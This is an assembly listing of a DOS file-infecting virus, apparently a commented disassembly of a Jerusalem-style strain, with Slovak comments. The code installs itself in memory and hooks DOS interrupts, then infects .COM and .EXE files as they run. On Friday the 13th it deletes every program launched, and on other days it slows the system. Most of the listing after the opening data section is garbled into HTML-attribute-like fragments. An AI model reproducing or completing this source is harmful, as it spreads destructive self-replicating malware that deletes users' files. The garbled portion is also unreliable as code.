

		TITLE	MS VIR
		PAGE	65,132

FRIDAY		EQU	5

CODE1		SEGMENT	AT 0
		ASSUME	CS:CODE1
		ORG	3FCH
PRESUN:
CODE1		ENDS

CODE		SEGMENT	PARA PUBLIC
		ASSUME	CS:CODE,DS:CODE
		ORG	0
;-------------------------------------------------
START:		JMP	Near Ptr START_COM+100h	;POVODNY OFFSET JE O 100h VACSI
;-------------------------------------------------
		DB	'sU'		;NEPOUZITE

VIR_NAME	DB	'MsDos'		;ROZPOZNAVACI RETAZEC VIRUSU
START_ADR	DD	?		;STARTOVACIA ADRESA .COM SUBORU
FRI_13		DB	0		;PRIZNAK PIATKU 13.
DRIV_VAL	DW	0		;PLATNOST DR.V PRIK.RIADKU(VZDY PLATNE) 
LEN_COM		DW	?		;DLZKA POV..COM SUBORU (BEZ VIRUSU)

SAV_I8		DD	?		;OBSLUHA POV. INT 8
SAV_I21		DD	?		;OBSLUHA POV. INT 21H
SAV_I24		DD	?		;OBSLUHA POV. INT 24H

TIME_OUT	DW	?		;POCITADLO PRERUSENI 8

H00021		DW	?		;POUZIVA SL. 0DEh
H00023		DW	?		;	- " -
H00025		DW	?		;	- " -
H00027		DW	?		;	- " -
H00029		DW	?		;	- " -
H0002B		DW	?		;	- " -
H0002D		DW	?		;	- " -
H0002F		DW	?		;	- " -

SAV_ES		DW	?		;SEG. ADR. PSP
VIR_SIZE	DW	80H		;DLZKA REZ. CASTI VIRUSU V PARAGRAFOCH

EPB:					;BLOK PARAMETROV PRE SL. 4B
		DW	0		;SEG. ADR. ENVIRONMENT PRE SL. 4B
		DD	00000080H	;ADR. PRIKAZOVEHO RIADKU PRE PSP+80H
		DD	0000005CH	;ADR. FCB PRE PSP+5CH
		DD	0000006CH	;ADR. FCB PRE PSP+6CH

SAV_SP		DW	?		;ULOZENIE PARAMETROV
SAV_SS		DW	?		;Z HLAVICKY
SAV_IP		DW	?		;SUBORU
SAV_CS		DW	?		;TYPU .EXE

SAV_I0FF	DW	?		;ULOZENIE 3 BYTE ADRESY
		DB	?		;OBSLUHY INT 0FFh
COM_EXE		DB	?		;0 --> .COM, INAK .EXE

EXE_HEAD	LABEL	BYTE		;BUFFER PRE HLAVICKU .EXE SUBORU
SIGN		DB	'MZ'
PART_PAG	DW	?
PAG_CNT		DW	?
RELO_CNT	DW	?
HDR_SIZE	DW	?
MIN_MEM		DW	?
MAX_MEM		DW	?
RELO_SS		DW	?
EXE_SP		DW	?
CHK_SUM		DW	?
EXE_IP		DW	?
RELO_CS		DW	?
TABL_OFF	DW	?
OVERLAY		DW	?

BUFFER		DB	5 DUP (?)		;PRE POSLEDNYCH 5 BYTE SUBORU 

F_HANDLE	DW	?			;AK 0FFFFh ZIADEN S. NIE JE OTV.
F_ATTR		DW	?			;ATRIB. OTVORENEHO SUBORU
F_DATE		DW	?			;DATUM		- " -
F_TIME		DW	?			;CAS		- " -

PAGE_LEN	DW	200H			;DLZKA STRANKY .EXE SUBORU
PAR_LEN		DW	10H			;DLZKA PARAGRAFU

LEN_EXE		DD	?			;DLZKA POV. EXE SUBORU
F_SPEC		DD	?			;ADRESA RET. SO SPEC. SUBORU

TEXT_COM	DB	'COMMAND.COM'		;MENO PRIKAZOVEHO SUBORU
MEM_ALL?	DW	?			;0-PAM. NEBOLA ALOK.,INAK BOLA 

		DW	0,0			;NEPOUZITE
;------------------------------------------------------------
START_COM	PROC	FAR
		CLD	
		MOV	AH,0E0h
		INT	21h			;JE VIRUS INSTALOVANY?
		CMP	AH,0E0h
		JNB	INST_VIR		;NAINSTALUJ
		CMP	AH,03h
		JB	INST_VIR		;NAINSTALUJ
		MOV	AH,0DDh
		MOV	DI,0100h
		MOV	SI,0710h
		ADD	SI,DI
		MOV	CX,CS:[DI+OFFSET LEN_COM]
		INT	21h			;VIRUS JE V DOS, POSUN POV. COM
INST_VIR:	MOV	AX,CS
		ADD	AX,0010h
		MOV	SS,AX
		MOV	SP,OFFSET STACK1
		PUSH	AX
		MOV	AX,OFFSET START_EXE
		PUSH	AX
		RET				;SKOK NA START_EXE
START_COM	ENDP
;-------------------------------------------------
START_EXE:	CLD
		PUSH	ES			;SEGMENT_OPERATION
		MOV	CS:SAV_ES,ES		;ULOZI BAZOVU ADR. PSP
		MOV	CS:Word Ptr EPB+4,ES
		MOV	CS:Word Ptr EPB+8,ES
		MOV	CS:Word Ptr EPB+12,ES
		MOV	AX,ES
		ADD	AX,0010h
		ADD	CS:SAV_CS,AX		;ULOZI BAZOVU ADRESU VIRUSU
		ADD	CS:SAV_SS,AX
		MOV	AH,0E0h
		INT	21h			;JE VIRUS INSTALOVANY?
		CMP	AH,0E0h
		JNB	INST_V3			;NIE JE, POKRACUJ V INSTALOVANI
		CMP	AH,03h
		POP	ES			;SEGMENT_OPERATION
		MOV	SS,CS:SAV_SS		;NASTAV SS A SP PODLA
		MOV	SP,CS:SAV_SP		;POVODNEJ .EXE HLAVICKY
		JMP	CS:Dword Ptr SAV_IP	;JMP NA ZACIATOK .EXE PROGRAMU
;-------------------------------------------------
INST_V3:	XOR	AX,AX
		MOV	ES,AX				;ES <-- 0="" mov="" ax,es:03fch="" mov="" word="" ptr="" cs:sav_i0ff,ax="" mov="" al,es:03feh="" mov="" byte="" ptr="" cs:sav_i0ff+2,al="" mov="" word="" ptr="" es:03fch,0a5f3h="" ;repz="" movsw="" mov="" byte="" ptr="" es:03feh,0cbh="" ;retf="" pop="" ax="" ;ax=""></--><-- seg.="" adr.="" psp="" add="" ax,0010h="" mov="" es,ax="" ;es=""></--><-- seg.="" adr.="" psp="" +="" 10="" push="" cs="" pop="" ds="" ;ds=""></--><-- seg.="" adr.="" virusu="" mov="" cx,0710h="" ;dlzka="" virusu="" shr="" cx,1="" ;/2="" (dlzka="" v="" slovach)="" xor="" si,si="" ;si=""></--><-- 0="" mov="" di,si="" ;di=""></--><-- 0="" push="" es="" ;uloz="" navratovu="" adresu="" mov="" ax,offset="" inst_v4="" push="" ax="" jmp="" far="" ptr="" presun="" ;jmp="" 0:3fch="" ;program="" na="" adrese="" 0:3fch="" presunie="" virus="" na="" zaciatok="" programu="" (v="" .exe="" suboroch="" ;je="" ulozeny="" na="" konci).="" ak="" ide="" o="" .com="" subor="" nestane="" sa="" nic.="" ;-------------------------------------------------="" inst_v4:="" mov="" ax,cs="" mov="" ss,ax="" mov="" sp,offset="" stack1="" xor="" ax,ax="" mov="" ds,ax="" mov="" ax,word="" ptr="" cs:sav_i0ff="" mov="" ds:03fch,ax="" mov="" al,byte="" ptr="" cs:sav_i0ff+2="" mov="" ds:03feh,al="" ;obnovenie="" int="" 0ffh="" mov="" bx,sp="" ;bx=""></--><-- adr.="" konca="" virusu="" mov="" cl,04h="" shr="" bx,cl="" ;/16="" (adr.="" konca="" v="" par.)="" add="" bx,+10h="" ;dlzka="" psp+virusu="" v="" par.="" mov="" cs:vir_size,bx="" mov="" ah,4ah="" mov="" es,cs:sav_es="" ;seg.="" adr.="" psp="" int="" 21h="" ;zmen="" dl.="" pam.="" bloku="" na="" vir_size="" mov="" ax,3521h="" int="" 21h="" ;interrupt="" vector="" mov="" word="" ptr="" cs:sav_i21,bx="" ;uloz="" adresu="" mov="" word="" ptr="" cs:sav_i21+2,es;povodneho="" int="" 21="" push="" cs="" pop="" ds="" mov="" dx,offset="" i21_vir="" mov="" ax,2521h="" int="" 21h="" ;zmen="" adr.="" int="" 21="" na="" i21_vir="" mov="" es,sav_es="" ;seg.="" adr.="" psp="" mov="" es,es:[002ch]="" ;seg.="" adr.="" dos="" environment="" xor="" di,di="" mov="" cx,7fffh="" xor="" al,al="" l1:="" repnz="" scasb="" cmp="" es:[di],al="" ;vyhlada="" dve="" za="" loopnz="" l1="" ;sebou="" iduce="" nuly="" mov="" dx,di="" add="" dx,+03h="" ;zac.str.s="" cestou="" a="" menom="" prog.="" mov="" ax,4b00h="" ;sluzba="" exec="" push="" es="" pop="" ds="" push="" cs="" pop="" es="" ;adresa="" mov="" bx,offset="" epb="" ;epb="" push="" ds="" push="" es="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" mov="" ah,2ah="" int="" 21h="" ;date="" mov="" byte="" ptr="" cs:fri_13,00h="" ;nie="" je="" piatok="" 13.!="" cmp="" cx,1987="" ;je="" rok="" 1987?="" jz="" noins_i8="" ;skok="" ak="" je="" cmp="" al,friday="" ;je="" piatok?="" jnz="" ins_i8="" ;skok="" ak="" nie="" je="" cmp="" dl,13="" ;je="" 13.?="" jnz="" ins_i8="" ;skok="" ak="" nie="" je="" inc="" byte="" ptr="" cs:fri_13="" ;je="" piatok="" 13.!="" jmp="" short="" noins_i8="" ;-------------------------------------------------="" nop="" ins_i8:="" mov="" ax,3508h="" int="" 21h="" ;interrupt="" vector="" mov="" word="" ptr="" cs:sav_i8,bx="" ;uloz="" adresu="" mov="" word="" ptr="" cs:sav_i8+2,es="" ;povodneho="" i8="" push="" cs="" pop="" ds="" mov="" time_out,7e90h="" ;29="" min="" a="" 42="" s="" mov="" ax,2508h="" mov="" dx,offset="" i8_vir="" int="" 21h="" ;set="" intrpt="" vector="" 8="" to="" i8_vir="" noins_i8:="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" pop="" es="" pop="" ds="" pushf="" call="" cs:dword="" ptr="" sav_i21="" ;volanie="" orig.="" i21="" sl.4b00="" ;tu="" sa="" vykona="" samotny="" program,="" ktory="" je="" nainfikovany="" virusom="" push="" ds="" pop="" es="" mov="" ah,49h="" int="" 21h="" ;uvolni="" pamat="" al.="" pre="" program="" mov="" ah,4dh="" int="" 21h="" ;navratovy="" kod="" uloz="" do="" al="" mov="" ah,31h="" mov="" dx,0600h="" ;dlzka="" rez.="" casti="" virusu="" mov="" cl,04h="" shr="" dx,cl="" ;/16="" (dlzka="" v="" par.)="" add="" dx,+10h="" ;+="" dlzka="" psp="" int="" 21h="" ;zrezidentni="" virus="" ;-------------------------------------------------="" i24_vir:="" xor="" al,al="" iret="" ;-------------------------------------------------="" ;obsluha="" prerusenia="" 8.="" sem="" je="" i8="" presmerovane="" len="" ak="" nie="" je="" rok="" 1987="" a="" ;nie="" je="" piatok="" 13.="" ;ak="" je="" i8="" presmerovane,="" tak="" po="" 29="" min="" a="" 42="" s="" sa="" zmeni="" obrazovka="" a="" podstatne="" sa="" ;spomali="" cinnost="" systemu.="" i8_vir:="" cmp="" cs:time_out,+02h="" ;bude="" koncit="" time_out?="" jnz="" i8_1="" ;skok="" ak="" nebude="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" bp="" mov="" ax,0602h="" ;posun="" okno="" hore="" o="" 2="" riadky="" mov="" bh,87h="" ;volne="" riadky="" budu="" blikat="" mov="" cx,0505h="" ;lavy="" horny="" roh:="" 5,5="" mov="" dx,1010h="" ;pravy="" dolny="" roh:="" 10,10="" int="" 10h="" ;scroll="" window="" up="" pop="" bp="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" i8_1:="" dec="" word="" ptr="" cs:time_out="" jnz="" i8_2="" ;skok="" ak="" nedopocital="" na="" 0="" mov="" cs:time_out,0001h="" push="" ax="" push="" cx="" push="" si="" mov="" cx,4001h="" repz="" lodsb="" ;cakacia="" slucka="" pop="" si="" pop="" cx="" pop="" ax="" i8_2:="" jmp="" cs:dword="" ptr="" sav_i8="" ;skok="" na="" orig.="" i8="" ;-------------------------------------------------="" ;="" obsluha="" prerusenia="" 21.="" ;="" obsluhuje="" sluzby="" 4b00h,="" 0ddh,="" 0deh="" a="" 0e0h.="" ;-="" sluzba="" 4b00h:="" ak="" je="" fri_13="1" zmaze="" zavadzany="" subor="" ;="" ak="" je="" fri_13="0" nainfikuje="" zavadzany="" subor="" ;-="" sluzba="" 0deh="" je="" definovana,="" no="" samotny="" virus="" ju="" nikdy="" nevola.="" nie="" je="" ani="" ;="" blizsie="" analyzovana.="" ;-="" sluzba="" 0ddh="" presune="" blok="" pamate="" a="" spusti="" program="" od="" adresy="" 100h="" v="" segmente="" ;="" odkial="" bolo="" int="" 21="" volane:="" ;="" vstup="" ah="0DDh" cx="" -="" pocet="" prenasanych="" byteov="" ;="" ds:si="" -="" adr.="" zdrojoveho="" bloku="" es:di="" -="" adr.="" cieloveho="" bloku="" ;-="" sluzba="" 0e0h="" vracia="" v="" ax="" 0300h="" ak="" je="" virus="" instalovany,="" i21_vir:="" pushf="" cmp="" ah,0e0h="" jnz="" i21_1="" ;skok="" ak="" to="" nie="" je="" sl.="" 0e0h="" mov="" ax,0300h="" ;navratovy="" kod="" sl.="" 0e0h="" popf="" iret="" i21_1:="" cmp="" ah,0ddh="" jz="" ser_dd="" ;skok="" ak="" to="" je="" sl.="" 0ddh="" cmp="" ah,0deh="" jz="" ser_de="" ;skok="" ak="" to="" je="" sl.="" 0deh="" cmp="" ax,4b00h="" jnz="" i21="" ;skok="" ak="" to="" nie="" je="" sl.="" 4b00h="" jmp="" ser_4b00="" ;skok="" ak="" to="" je="" sl.="" 4b00h="" ;-------------------------------------------------="" i21:="" popf="" jmp="" cs:dword="" ptr="" sav_i21="" ;skok="" na="" adr.="" pov.="" i21="" ;-------------------------------------------------="" ser_dd:="" pop="" ax="" pop="" ax="" mov="" ax,0100h="" mov="" word="" ptr="" cs:start_adr,ax="" ;nastavi="" navratovu="" pop="" ax="" ;adresu="" na="" 100h="" v="" segmente="" mov="" word="" ptr="" cs:start_adr+2,ax="" ;odkial="" bolo="" i21="" volane="" repz="" movsb="" ;vykonaj="" presun="" popf="" mov="" ax,cs:driv_val="" jmp="" cs:dword="" ptr="" start_adr="" ;-------------------------------------------------="" ser_de:="" add="" sp,+06h="" popf="" mov="" ax,cs="" mov="" ss,ax="" mov="" sp,0710h="" push="" es="" push="" es="" xor="" di,di="" push="" cs="" pop="" es="" mov="" cx,0010h="" mov="" si,bx="" mov="" di,offset="" h00021="" repz="" movsb="" mov="" ax,ds="" mov="" es,ax="" mul="" cs:par_len="" add="" ax,cs:h0002b="" adc="" dx,+00h="" div="" cs:par_len="" mov="" ds,ax="" mov="" si,dx="" mov="" di,dx="" mov="" bp,es="" mov="" bx,cs:h0002f="" or="" bx,bx="" jz="" h003ed="" h003da:="" mov="" cx,8000h="" repz="" movsw="" add="" ax,1000h="" add="" bp,1000h="" mov="" ds,ax="" mov="" es,bp="" dec="" bx="" jnz="" h003da="" h003ed:="" mov="" cx,cs:h0002d="" repz="" movsb="" pop="" ax="" push="" ax="" add="" ax,0010h="" add="" cs:h00029,ax="" add="" cs:h00025,ax="" mov="" ax,cs:h00021="" pop="" ds="" pop="" es="" mov="" ss,cs:h00029="" mov="" sp,cs:h00027="" jmp="" dword="" ptr="" cs:h00023="" ;-------------------------------------------------="" del_file:="" xor="" cx,cx="" mov="" ax,4301h="" int="" 21h="" ;nastav="" attr="" aby="" sa="" dal="" zmazat="" mov="" ah,41h="" int="" 21h="" ;zmaz="" subor="" mov="" ax,4b00h="" popf="" jmp="" cs:dword="" ptr="" sav_i21="" ;skok="" na="" pov.="" i21="" ;-------------------------------------------------="" ser_4b00:="" cmp="" byte="" ptr="" cs:fri_13,01h="" ;je="" piatok="" 13.?="" jz="" del_file="" ;skok="" ak="" ano="" mov="" cs:f_handle,0ffffh="" mov="" cs:mem_all?,0000h="" mov="" word="" ptr="" cs:f_spec,dx="" ;uloz="" adr.="" specifikacie="" mov="" word="" ptr="" cs:f_spec+2,ds="" ;suboru="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" si="" push="" di="" push="" ds="" push="" es="" cld="" mov="" di,dx="" ;di=""></--><-- zaciatok="" f_spec="" stringu="" xor="" dl,dl="" ;pouzi="" aktualny="" disk="" cmp="" byte="" ptr="" [di+01h],':'="" ;je="" specifikovany="" disk?="" jnz="" i21_2="" ;ak="" nie,="" pouzi="" aktualny="" mov="" dl,[di]="" ;zisti="" cislo="" spec.="" disku="" and="" dl,1fh="" ;a="" uloz="" ho="" do="" dl="" i21_2:="" mov="" ah,36h="" int="" 21h="" ;zisti="" miesto="" na="" disku="" cmp="" ax,0ffffh="" jnz="" i21_3="" ;skok="" ak="" nebol="" chybny="" drive="" i21_4:="" jmp="" orig_i21="" ;skok="" pri="" chybe="" ;-------------------------------------------------="" i21_3:="" mul="" bx="" mul="" cx="" ;dx:ax=""></--><-- volnych="" byteov="" or="" dx,dx="" ;je="" to="" viac="" ako="" 0ffffh?="" jnz="" enough_sp="" ;skok="" ak="" ano="" cmp="" ax,0710h="" ;je="" to="" viac="" ako="" 710h?="" jb="" i21_4="" ;skok="" ak="" nie="" enough_sp:="" mov="" dx,word="" ptr="" cs:f_spec="" push="" ds="" pop="" es="" xor="" al,al="" mov="" cx,0041h="" repnz="" scasb="" ;di=""></--><-- adresa="" konca="" ret.+1="" mov="" si,word="" ptr="" cs:f_spec="" i21_5:="" mov="" al,[si]="" ;al=""></--><-- znak="" or="" al,al="" ;je="" to="" posledny="" znak?="" jz="" i21_6="" ;skok="" ak="" ano="" cmp="" al,'a'="" ;je="" to="" jb="" up_case="" ;male="" pismeno="" cmp="" al,'z'="" ;skok="" na="" ja="" up_case="" ;up_case="" ak="" nie="" sub="" byte="" ptr="" [si],20h="" ;zmen="" male="" na="" velke="" up_case:="" inc="" si="" ;dalsi="" znak="" jmp="" short="" i21_5="" ;-------------------------------------------------="" i21_6:="" mov="" cx,000bh="" sub="" si,cx="" mov="" di,offset="" text_com="" push="" cs="" pop="" es="" mov="" cx,000bh="" repz="" cmpsb="" ;je="" to="" command.com="" jnz="" i21_7="" ;skok="" ak="" nie="" jmp="" orig_i21="" ;command.com="" nezmeni!="" ;-------------------------------------------------="" i21_7:="" mov="" ax,4300h="" int="" 21h="" ;citaj="" atributy="" suboru="" jb="" err1="" ;skoc="" pri="" chybe="" mov="" cs:f_attr,cx="" ;uloz="" atributy="" suboru="" err1:="" jb="" err2="" ;skoc="" pri="" chybe="" xor="" al,al="" mov="" cs:com_exe,al="" ;nastav="" priznak="" na="" .com="" push="" ds="" pop="" es="" mov="" di,dx="" mov="" cx,0041h="" repnz="" scasb="" ;di=""></--><-- konec="" retazca+1="" cmp="" byte="" ptr="" [di-2],'m'="" jz="" i21_8="" ;je="" to="" .com="" cmp="" byte="" ptr="" [di-2],'m'="" jz="" i21_8="" ;je="" to="" .com="" inc="" byte="" ptr="" cs:[004eh]="" ;je="" to="" .exe,="" zmen="" priznak="" i21_8:="" mov="" ax,3d00h="" int="" 21h="" ;otvori="" subor="" na="" citanie="" err2:="" jb="" err3="" ;skoc="" pri="" chybe="" mov="" cs:f_handle,ax="" ;uloz="" file="" handle="" mov="" bx,ax="" mov="" ax,4202h="" mov="" cx,0ffffh="" mov="" dx,0fffbh="" ;posun="" pointer="" v="" subore="" int="" 21h="" ;na="" 5.="" poziciu="" od="" konca="" jb="" err2="" ;skoc="" pri="" chybe="" add="" ax,0005h="" mov="" cs:len_com,ax="" ;uloz="" dlzku="" suboru="" mov="" cx,5="" ;cx=""></--><-- dlzka="" mena="" virusu="" mov="" dx,offset="" buffer="" mov="" ax,cs="" mov="" ds,ax="" mov="" es,ax="" mov="" ah,3fh="" ;citaj="" poslednych="" 5="" znakov="" int="" 21h="" ;zo="" suboru="" do="" buffer="" mov="" di,dx="" mov="" si,offset="" vir_name="" repz="" cmpsb="" ;je="" na="" konci="" suboru="" meno="" virusu?="" jnz="" i21_9="" ;skoc="" ak="" nie="" je="" mov="" ah,3eh="" int="" 21h="" ;uzavri="" subor="" jmp="" orig_i21="" ;a="" skoc="" na="" povodne="" i21="" ;-------------------------------------------------="" i21_9:="" mov="" ax,3524h="" int="" 21h="" ;interrupt="" vector="" mov="" word="" ptr="" sav_i24,bx="" mov="" word="" ptr="" sav_i24+2,es="" ;uloz="" pov.="" adr.="" i24="" mov="" dx,offset="" i24_vir="" mov="" ax,2524h="" int="" 21h="" ;presmeruj="" i24="" na="" i24_vir="" lds="" dx,f_spec="" xor="" cx,cx="" mov="" ax,4301h="" int="" 21h="" ;vynuluj="" atributy="" suboru="" err3:="" jb="" err4="" ;skoc="" pri="" chybe="" mov="" bx,cs:f_handle="" mov="" ah,3eh="" int="" 21h="" ;uzavri="" subor="" mov="" cs:f_handle,0ffffh="" ;nie="" je="" otvoreny="" ziadny="" subor="" mov="" ax,3d02h="" int="" 21h="" ;otvor="" subor="" pre="" citanie="" a="" zapis="" jb="" err4="" ;skoc="" pri="" chybe="" mov="" cs:f_handle,ax="" ;uloz="" file="" handle="" mov="" ax,cs="" mov="" ds,ax="" mov="" es,ax="" mov="" bx,f_handle="" mov="" ax,5700h="" int="" 21h="" ;zisti="" datum="" a="" cas="" suboru="" mov="" f_date,dx="" ;uloz="" datum="" mov="" f_time,cx="" ;uloz="" cas="" mov="" ax,4200h="" xor="" cx,cx="" mov="" dx,cx="" int="" 21h="" ;posun="" pointer="" na="" zac.="" suboru="" err4:="" jb="" err5="" ;skoc="" pri="" chybe="" cmp="" com_exe,00h="" ;je="" to="" .com?="" jz="" com="" ;skoc="" ak="" ano!="" jmp="" short="" exe="" ;je="" to="" .exe!="" ;-------------------------------------------------="" nop="" com:="" mov="" bx,1000h="" mov="" ah,48h="" int="" 21h="" ;alokuj="" 10000h="" byteov="" pamati="" jnb="" i21_10="" ;skoc="" ak="" sa="" alokovanie="" podarilo="" mov="" ah,3eh="" mov="" bx,f_handle="" int="" 21h="" ;uzavri="" subor="" jmp="" orig_i21="" ;skoc="" na="" originalne="" i21="" ;-------------------------------------------------="" i21_10:="" inc="" mem_all?="" mov="" es,ax="" ;seg.="" adr.="" alokovaneho="" buffra="" xor="" si,si="" ;si=""></--><-- 0="" mov="" di,si="" ;di=""></--><-- 0="" mov="" cx,0710h="" ;dlzka="" virusu="" repz="" movsb="" ;presun="" virus="" do="" buffra="" mov="" dx,di="" ;1.="" byte="" za="" virusom="" v="" buff.="" mov="" cx,len_com="" mov="" bx,f_handle="" push="" es="" pop="" ds="" mov="" ah,3fh="" ;nacitaj="" cely="" .com="" subor="" int="" 21h="" ;do="" buffra="" err5:="" jb="" err6="" ;skoc="" pri="" chybe="" add="" di,cx="" ;1.="" byte="" za="" koncom="" nac.="" suboru="" xor="" cx,cx="" mov="" dx,cx="" mov="" ax,4200h="" int="" 21h="" ;posun="" pointer="" na="" zac.="" suboru="" mov="" si,offset="" vir_name="" mov="" cx,0005h="" repz="" movs="" byte="" ptr="" es:0,byte="" ptr="" cs:0="" ;na="" koniec="" buffra="" presun="" 'msdos'="" mov="" cx,di="" ;dlzka="" suboru="" s="" virusom="" xor="" dx,dx="" mov="" ah,40h="" int="" 21h="" ;zapis="" subor="" s="" virusom="" na="" disk="" err6:="" jb="" err7="" ;skoc="" pri="" chybe="" jmp="" i21_11="" ;chyba="" sa="" nevyskytla="" ;-------------------------------------------------="" exe:="" mov="" cx,001ch="" ;dlzka="" .exe="" head="" mov="" dx,offset="" exe_head="" mov="" ah,3fh="" int="" 21h="" ;precitaj="" hlavicku="" .exe="" suboru="" err7:="" jb="" err8="" ;skoc="" pri="" chybe="" mov="" chk_sum,1984h="" mov="" ax,relo_ss="" mov="" sav_ss,ax="" mov="" ax,exe_sp="" mov="" sav_sp,ax="" mov="" ax,exe_ip="" mov="" sav_ip,ax="" mov="" ax,relo_cs="" mov="" sav_cs,ax="" mov="" ax,pag_cnt="" cmp="" part_pag,0="" ;je="" posledna="" stranka="" necela?="" jz="" i21_12="" ;skoc="" ak="" je="" cela="" dec="" ax="" i21_12:="" mul="" page_len="" ;dx:ax=""></--><-- pag_cnt="" *="" page_len="" add="" ax,part_pag="" adc="" dx,+00h="" ;+="" part_pag="" add="" ax,000fh="" adc="" dx,+00h="" and="" ax,0fff0h="" ;dx:ax=""></--><-- dl.="" zarovnana="" na="" par.="" mov="" word="" ptr="" len_exe,ax="" ;uloz="" dlzku="" nenakazeneho="" mov="" word="" ptr="" len_exe+2,dx="" ;.exe="" suboru="" add="" ax,0710h="" adc="" dx,+00h="" ;dx:ax=""></--><-- dlzka="" nenakaz.+virus="" err8:="" jb="" err9="" ;skoc="" pri="" chybe="" div="" page_len=""></--><--dlzka v="" str.=""></--dlzka><--zvysok or="" dx,dx="" jz="" i21_13="" ;skoc="" pri="" zvysku="" 0="" inc="" ax="" i21_13:="" mov="" pag_cnt,ax="" ;do="" hlavicky="" .exe="" suboru="" mov="" part_pag,dx="" ;uloz="" dlzku="" suboru="" s="" vyrusom="" mov="" ax,word="" ptr="" len_exe="" mov="" dx,word="" ptr="" len_exe+2="" div="" par_len="" ;ax=""></--zvysok><-- dlzka="" pov.="" suboru="" v="" par.="" sub="" ax,hdr_size="" ;-="" dlzka="" .exe="" hlavicky="" mov="" relo_cs,ax="" ;uloz="" cs="" virusu="" ako="" startovaci="" mov="" exe_ip,offset="" start_exe="" ;uloz="" start.="" offset="" virusu="" mov="" relo_ss,ax="" ;uloz="" ss="" virusu="" mov="" exe_sp,offset="" stack2="" ;uloz="" sp="" virusu="" xor="" cx,cx="" mov="" dx,cx="" mov="" ax,4200h="" int="" 21h="" ;nastav="" ukazovatel="" na="" zac.suboru="" err9:="" jb="" err10="" ;skoc="" pri="" chybe="" mov="" cx,001ch="" ;dlzka="" .exe="" hlavicky="" mov="" dx,offset="" exe_head="" mov="" ah,40h="" int="" 21h="" ;zapis="" novu="" .exe="" hlavicku="" err10:="" jb="" err11="" ;skoc="" pri="" chybe="" cmp="" ax,cx="" ;zapisana="" cela="" hlavicka?="" jnz="" i21_11="" ;skoc="" ak="" nie="" mov="" dx,word="" ptr="" len_exe="" mov="" cx,word="" ptr="" len_exe+2="" mov="" ax,4200h="" ;nastav="" pointer="" na="" koniec="" int="" 21h="" ;povodneho="" .exe="" suboru="" err11:="" jb="" i21_11="" ;skoc="" pri="" chybe="" xor="" dx,dx="" mov="" cx,0710h="" mov="" ah,40h="" int="" 21h="" ;zapis="" virus="" na="" koniec="" suboru="" ;tu="" spravil="" programator="" chybu,="" lebo="" uplne="" na="" koniec="" zabudol="" zapisat="" rozpoznavaci="" ;text="" 'msdos'.="" tym="" padom="" sa="" virus="" na="" .exe="" subory="" nahrava="" viackrat.="" i21_11:="" cmp="" cs:mem_all?,0="" ;bola="" alokovana="" pamat?="" jz="" i21_14="" ;skoc="" ak="" nebola="" mov="" ah,49h="" int="" 21h="" ;uvolni="" alokovanu="" pamat="" i21_14:="" cmp="" cs:f_handle,0ffffh="" ;bol="" otvoreny="" subor?="" jz="" orig_i21="" ;skoc="" ak="" nebol="" mov="" bx,cs:f_handle="" mov="" dx,cs:f_date="" mov="" cx,cs:f_time="" mov="" ax,5701h="" int="" 21h="" ;nastav="" povodny="" datum="" a="" cas="" mov="" ah,3eh="" int="" 21h="" ;uzavri="" subor="" lds="" dx,cs:f_spec="" mov="" cx,cs:f_attr="" mov="" ax,4301h="" int="" 21h="" ;nastav="" povodne="" atributy="" lds="" dx,cs:sav_i24="" mov="" ax,2524h="" int="" 21h="" ;nastav="" povodne="" int="" 24="" orig_i21:="" pop="" es="" pop="" ds="" pop="" di="" pop="" si="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" popf="" jmp="" cs:dword="" ptr="" sav_i21="" ;-------------------------------------------------="" db="" 0="" dw="" 85h="" dup(?)="" stack1="" dw="" 8="" dup(?)="" stack2:="" code="" ends="" end="" =""></-->